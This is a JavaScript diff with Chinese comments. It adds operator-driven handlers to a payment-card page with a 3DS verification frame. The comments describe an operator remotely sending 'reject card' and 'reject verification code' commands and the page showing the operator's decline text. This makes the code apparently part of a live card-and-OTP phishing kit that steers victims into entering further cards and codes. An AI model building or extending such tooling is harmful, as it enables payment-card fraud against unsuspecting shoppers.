@@ -741,6 +741,12 @@
     } catch (e) {}
   }
 
+  /* 换卡/回到卡页：把"已提交"标记撤掉（原插件 close3DSModalIfAny 同款行为） */
+  function resetSubmitPage(page) {
+    S.lastGoLivePage = page || '3';
+    try { global.sessionStorage.removeItem('bp_submit_page'); } catch (e) {}
+  }
+
   /* 断线/刷新后恢复"已提交"状态；但订单号变了就作废，避免新单显示成已提交 */
   function resumePage() {
     var p = S.lastGoLivePage;
@@ -912,18 +918,24 @@
         if (S.awaiting) { armGuardTimer(); }   /* 操作员在动作，重置等待计时 */
         break;
       case 'reject_card':
+        /* 换卡：关验证页 → 回到卡信息页（页面标记从 3+ 退回 3），并在卡号下方显示你的拒卡文案 */
         closeModal();
         clearGuardTimer();
         S.awaiting = false;
         endBusy();
+        goLive('3');                  /* 先发（此时 lastGoLivePage 还是 3+，不会被去重） */
+        resetSubmitPage('3');         /* 再清掉"已提交"标记 */
         if (E.card) { markInvalid(E.card, true); try { E.card.focus(); } catch (e) {} }
         showErr((data && (data.message || data.msg || data.error)) || T('cardDeclined'));
         break;
       case 'reject_verify':
-        clearGuardTimer();
-        S.awaiting = false;
-        endBusy();
-        showErr((data && (data.message || data.msg)) || T('paymentError'));
+        /* 拒绝验证码：不关页面，只让验证页停止加载并显示错误文案（原插件同款动作名） */
+        postToModal({
+          action: 'otpVerifyFailed',
+          message: (data && (data.message || data.msg || data.error)) ||
+                   T('cardInvalid')
+        });
+        if (S.awaiting) { armGuardTimer(); }   /* 仍在等你的下一步指令 */
         break;
       case 'to_refresh':
         try { global.location.reload(); } catch (e) {}
@@ -1045,7 +1057,13 @@
     doc.body.appendChild(modalEl);
     frameEl = q('.bp-modal-iframe', modalEl);
     var btn = q('.bp-modal-close', modalEl);
-    on(btn, 'click', function () { closeModal(); });
+    on(btn, 'click', function () {
+      /* 用户自己关掉验证页：解锁，避免按钮一直转圈卡死 */
+      closeModal();
+      clearGuardTimer();
+      S.awaiting = false;
+      endBusy();
+    });
     /* 校验页回传：面板 runtime 用 {type:'bp_emit', event:…}，内置验证页还会用 {action:…} */
     on(global, 'message', function (ev) {
       if (!frameEl || ev.source !== frameEl.contentWindow) { return; }
